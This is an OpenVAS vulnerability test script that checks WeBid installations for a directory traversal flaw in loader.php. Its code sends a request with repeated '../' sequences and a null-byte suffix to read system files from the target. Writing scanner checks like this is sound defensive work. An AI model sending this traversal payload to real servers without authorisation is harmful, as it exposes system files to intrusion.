###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webid_mult_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# WeBid Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803053");
  script_version("$Revision: 11374 $");
  script_bugtraq_id(56588);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-11-20 12:03:19 +0530 (Tue, 20 Nov 2012)");
  script_name("WeBid Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80140");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22828");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22829");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118197/webid-traversal.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115640/WeBid-1.0.4-RFI-File-Disclosure-SQL-Injection.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected
  application and execute arbitrary script code");

  script_tag(name:"affected", value:"WeBid version 1.0.5 and prior");

  script_tag(name:"insight", value:"The flaws are due to improper input validation:

  - Input passed via the 'js' parameter to loader.php, which allows attackers
  to read arbitrary files via a ../(dot dot) sequences.

  - Input passed via the 'Copyright' parameter to admin/settings.php, is not
  properly sanitised before it is returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running WeBid and is prone to directory traversal
  and multiple cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

webPort = get_http_port(default:80);

if(!can_host_php(port:webPort)){
  exit(0);
}

files = traversal_files();

foreach dir (make_list_unique("/WeBid", "/webid", "/", cgi_dirs(port:webPort))){

  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:webPort );
  if( isnull( res ) ) continue;

  if( res =~ "HTTP/1.. 200" && ">WeBid<" >< res && '>Login<' >< res &&
      '>Register now' >< res && '>Sell an item' >< res ){

    foreach file (keys(files)){
      url = dir + "/loader.php?js=" + crap(data:"../", length:3*15) + files[file] + "%00.js;";

      if(http_vuln_check(port:webPort, url:url, check_header:TRUE, pattern:file)){
        report = report_vuln_url(port:webPort, url:url);
        security_message(port:webPort, data:report);
        exit(0);
      }
    }
  }
}

exit(99);